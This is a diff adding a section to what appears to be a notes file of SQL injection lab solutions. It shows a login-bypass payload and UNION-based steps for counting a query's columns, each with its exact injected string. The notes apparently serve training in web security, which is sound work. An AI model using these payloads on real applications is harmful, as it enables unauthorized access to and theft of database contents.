@@ -17,3 +17,14 @@ SELECT * FROM users WHERE username = 'administrator' --' AND password = 'SuperP@
 
 > Payload : `administrator' --`
 
+## SQL injection UNION attack, determining the number of columns returned by the query
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts'
+SELECT * FROM products WHERE category = 'Gifts' --'
+SELECT * FROM products WHERE category = 'Gifts' ORDER BY 4--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL--'
+```
+
+> Payload : `' UNION SELECT NULL,NULL,NULL--`
+
